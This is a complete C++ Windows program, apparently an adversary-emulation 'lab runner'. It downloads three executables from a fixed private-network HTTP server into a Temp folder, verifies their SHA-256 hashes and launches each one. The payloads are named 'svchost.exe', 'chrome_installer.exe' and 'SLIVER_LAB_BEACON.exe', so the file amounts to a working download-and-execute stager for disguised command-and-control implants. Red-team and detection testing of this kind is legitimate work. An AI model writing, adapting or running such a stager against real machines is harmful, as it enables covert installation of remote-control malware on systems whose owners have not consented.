#define UNICODE
#define _UNICODE
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winhttp.h>
#include <bcrypt.h>

#include <array>
#include <cstdint>
#include <cstdio>
#include <filesystem>
#include <fstream>
#include <iomanip>
#include <iostream>
#include <sstream>
#include <stdexcept>
#include <string>
#include <vector>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "bcrypt.lib")

namespace fs = std::filesystem;

namespace {
constexpr wchar_t kServerHost[] = L"192.168.50.10";
constexpr INTERNET_PORT kServerPort = 8000;
constexpr wchar_t kDestination[] = LR"(C:\Windows\Temp\Kisec\payloads)";
constexpr std::uint64_t kDownloadLimit = 100ULL * 1024ULL * 1024ULL;
constexpr DWORD kChunkSize = 1024U * 1024U;
struct PayloadDefinition {
    const wchar_t* fileName;
    const char* expectedSha256;
};

constexpr PayloadDefinition kPayloads[] = {
    {L"svchost.exe", "58f6354765f15e1fcd2041b5adda0f2349f856f8eac9bcec6dd4fe637fb9ac30"},
    {L"chrome_installer.exe", "d57cad5e6429f5a98e2b77eb0379a364703e5097152d47c98f6c46168731f349"},
    {L"SLIVER_LAB_BEACON.exe", "44beaa132f87724158ab25cb424e32b3245c53101f563093d2d02efda56d1fc6"},
};

class WinHttpHandle {
public:
    explicit WinHttpHandle(HINTERNET handle = nullptr) : handle_(handle) {}
    ~WinHttpHandle() { if (handle_) WinHttpCloseHandle(handle_); }
    WinHttpHandle(const WinHttpHandle&) = delete;
    WinHttpHandle& operator=(const WinHttpHandle&) = delete;
    operator HINTERNET() const { return handle_; }
private:
    HINTERNET handle_;
};

std::string WindowsError(DWORD code = GetLastError()) {
    char* text = nullptr;
    const DWORD size = FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM |
            FORMAT_MESSAGE_IGNORE_INSERTS,
        nullptr, code, 0, reinterpret_cast<char*>(&text), 0, nullptr);
    std::string result = size && text ? std::string(text, size) : "Windows error " + std::to_string(code);
    if (text) LocalFree(text);
    while (!result.empty() && (result.back() == '\r' || result.back() == '\n')) result.pop_back();
    return result;
}

std::string WideToUtf8(const std::wstring& value) {
    if (value.empty()) return {};
    const int size = WideCharToMultiByte(CP_UTF8, 0, value.data(),
        static_cast<int>(value.size()), nullptr, 0, nullptr, nullptr);
    if (size <= 0) throw std::runtime_error("UTF-8 conversion failed: " + WindowsError());
    std::string result(static_cast<std::size_t>(size), '\0');
    WideCharToMultiByte(CP_UTF8, 0, value.data(), static_cast<int>(value.size()),
        result.data(), size, nullptr, nullptr);
    return result;
}

std::string UtcTimestamp() {
    SYSTEMTIME st{};
    GetSystemTime(&st);
    char buffer[32]{};
    std::snprintf(buffer, sizeof(buffer), "%04u-%02u-%02uT%02u:%02u:%02u.%03uZ",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
    return buffer;
}

const fs::path kLogPath = fs::path(kDestination) / L"runner_log.txt";

void Log(const std::string& message) {
    const std::string line = UtcTimestamp() + " " + message;
    std::cout << line << std::endl;
    std::ofstream output(kLogPath, std::ios::binary | std::ios::app);
    if (!output) throw std::runtime_error("Cannot open log file");
    output << line << "\r\n";
}

std::string Sha256File(const fs::path& path) {
    BCRYPT_ALG_HANDLE algorithm = nullptr;
    BCRYPT_HASH_HANDLE hash = nullptr;
    DWORD objectSize = 0, hashSize = 0, received = 0;
    std::vector<UCHAR> object;
    std::vector<UCHAR> digest;

    auto check = [](NTSTATUS status, const char* action) {
        if (status < 0) throw std::runtime_error(std::string(action) + " failed");
    };

    try {
        check(BCryptOpenAlgorithmProvider(&algorithm, BCRYPT_SHA256_ALGORITHM, nullptr, 0),
            "BCryptOpenAlgorithmProvider");
        check(BCryptGetProperty(algorithm, BCRYPT_OBJECT_LENGTH,
            reinterpret_cast<PUCHAR>(&objectSize), sizeof(objectSize), &received, 0),
            "BCryptGetProperty(object length)");
        check(BCryptGetProperty(algorithm, BCRYPT_HASH_LENGTH,
            reinterpret_cast<PUCHAR>(&hashSize), sizeof(hashSize), &received, 0),
            "BCryptGetProperty(hash length)");
        object.resize(objectSize);
        digest.resize(hashSize);
        check(BCryptCreateHash(algorithm, &hash, object.data(), objectSize, nullptr, 0, 0),
            "BCryptCreateHash");

        std::ifstream input(path, std::ios::binary);
        if (!input) throw std::runtime_error("Cannot open downloaded file for hashing");
        std::vector<char> buffer(kChunkSize);
        while (input) {
            input.read(buffer.data(), static_cast<std::streamsize>(buffer.size()));
            const auto count = input.gcount();
            if (count > 0) {
                check(BCryptHashData(hash, reinterpret_cast<PUCHAR>(buffer.data()),
                    static_cast<ULONG>(count), 0), "BCryptHashData");
            }
        }
        if (!input.eof()) throw std::runtime_error("Error while reading downloaded file");
        check(BCryptFinishHash(hash, digest.data(), hashSize, 0), "BCryptFinishHash");
    } catch (...) {
        if (hash) BCryptDestroyHash(hash);
        if (algorithm) BCryptCloseAlgorithmProvider(algorithm, 0);
        throw;
    }
    BCryptDestroyHash(hash);
    BCryptCloseAlgorithmProvider(algorithm, 0);

    std::ostringstream result;
    result << std::hex << std::setfill('0');
    for (const UCHAR byte : digest) result << std::setw(2) << static_cast<unsigned>(byte);
    return result.str();
}

fs::path DownloadAndVerify(HINTERNET connection, const PayloadDefinition& payload) {
    const fs::path finalPath = fs::path(kDestination) / payload.fileName;
    fs::path temporaryPath = finalPath;
    temporaryPath += L".part";
    std::error_code ignored;
    fs::remove(temporaryPath, ignored);

    const std::wstring objectName = std::wstring(L"/") + payload.fileName;
    Log("DOWNLOAD_START file=" + WideToUtf8(payload.fileName) +
        " url=http://192.168.50.10:8000/" + WideToUtf8(payload.fileName));

    WinHttpHandle request(WinHttpOpenRequest(connection, L"GET", objectName.c_str(),
        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0));
    if (!request) throw std::runtime_error("WinHttpOpenRequest failed: " + WindowsError());

    DWORD redirectPolicy = WINHTTP_OPTION_REDIRECT_POLICY_NEVER;
    if (!WinHttpSetOption(request, WINHTTP_OPTION_REDIRECT_POLICY,
            &redirectPolicy, sizeof(redirectPolicy))) {
        throw std::runtime_error("Cannot disable redirects: " + WindowsError());
    }
    if (!WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA, 0, 0, 0) || !WinHttpReceiveResponse(request, nullptr)) {
        throw std::runtime_error("HTTP request failed: " + WindowsError());
    }

    DWORD status = 0, statusSize = sizeof(status);
    if (!WinHttpQueryHeaders(request, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            WINHTTP_HEADER_NAME_BY_INDEX, &status, &statusSize, WINHTTP_NO_HEADER_INDEX)) {
        throw std::runtime_error("Cannot read HTTP status: " + WindowsError());
    }
    if (status >= 300 && status < 400) throw std::runtime_error("Redirect downloads are not allowed");
    if (status != 200) throw std::runtime_error("HTTP status " + std::to_string(status));

    ULONGLONG declaredLength = 0;
    DWORD lengthSize = sizeof(declaredLength);
    if (WinHttpQueryHeaders(request,
            WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER64,
            WINHTTP_HEADER_NAME_BY_INDEX, &declaredLength, &lengthSize,
            WINHTTP_NO_HEADER_INDEX) && declaredLength > kDownloadLimit) {
        throw std::runtime_error("Declared file size exceeds the limit");
    }

    std::uint64_t total = 0;
    try {
        std::ofstream output(temporaryPath, std::ios::binary | std::ios::trunc);
        if (!output) throw std::runtime_error("Cannot create temporary download file");
        std::vector<char> buffer(kChunkSize);
        for (;;) {
            DWORD read = 0;
            if (!WinHttpReadData(request, buffer.data(), static_cast<DWORD>(buffer.size()), &read))
                throw std::runtime_error("Download read failed: " + WindowsError());
            if (read == 0) break;
            total += read;
            if (total > kDownloadLimit) throw std::runtime_error("Download exceeds the size limit");
            output.write(buffer.data(), read);
            if (!output) throw std::runtime_error("Download write failed");
        }
        output.close();
        if (!output) throw std::runtime_error("Download file close failed");
    } catch (...) {
        fs::remove(temporaryPath, ignored);
        throw;
    }

    const std::string actualHash = Sha256File(temporaryPath);
    if (actualHash != payload.expectedSha256) {
        fs::remove(temporaryPath, ignored);
        throw std::runtime_error("SHA-256 mismatch: file=" + WideToUtf8(payload.fileName) +
            " expected=" + payload.expectedSha256 + " actual=" + actualHash);
    }

    if (!MoveFileExW(temporaryPath.c_str(), finalPath.c_str(),
            MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
        fs::remove(temporaryPath, ignored);
        throw std::runtime_error("Cannot finalize downloaded file: " + WindowsError());
    }
    Log("VERIFIED file=" + WideToUtf8(payload.fileName) + " bytes=" +
        std::to_string(total) + " sha256=" + actualHash);
    return finalPath;
}

void Launch(const fs::path& path) {
    std::wstring commandLine = L"\"" + path.wstring() + L"\"";
    STARTUPINFOW startup{};
    startup.cb = sizeof(startup);
    PROCESS_INFORMATION process{};
    if (!CreateProcessW(path.c_str(), commandLine.data(), nullptr, nullptr, FALSE, 0,
            nullptr, kDestination, &startup, &process)) {
        throw std::runtime_error("Cannot launch " + WideToUtf8(path.filename().wstring()) +
            ": " + WindowsError());
    }
    Log("LAUNCHED file=" + WideToUtf8(path.filename().wstring()) +
        " pid=" + std::to_string(process.dwProcessId));
    CloseHandle(process.hThread);
    CloseHandle(process.hProcess);
}
} // namespace

int wmain() {
    try {
        fs::create_directories(kDestination);
        { std::ofstream clear(kLogPath, std::ios::binary | std::ios::trunc); }

        WinHttpHandle session(WinHttpOpen(L"KISEC-LabRunner/1.0",
            WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS, 0));
        if (!session) throw std::runtime_error("WinHttpOpen failed: " + WindowsError());
        const DWORD timeoutMs = 20000;
        if (!WinHttpSetTimeouts(session, timeoutMs, timeoutMs, timeoutMs, timeoutMs))
            throw std::runtime_error("Cannot set HTTP timeouts: " + WindowsError());

        WinHttpHandle connection(WinHttpConnect(session, kServerHost, kServerPort, 0));
        if (!connection) throw std::runtime_error("WinHttpConnect failed: " + WindowsError());

        std::vector<fs::path> verifiedPaths;
        for (const auto& payload : kPayloads)
            verifiedPaths.push_back(DownloadAndVerify(connection, payload));
        Log("ALL_PAYLOADS_VERIFIED");
        for (const auto& path : verifiedPaths) Launch(path);
        Log("RUNNER_COMPLETE");
        return 0;
    } catch (const std::exception& exception) {
        try { Log(std::string("ERROR detail=") + exception.what()); }
        catch (...) { std::cerr << "[ERROR] " << exception.what() << std::endl; }
        return 1;
    }
}
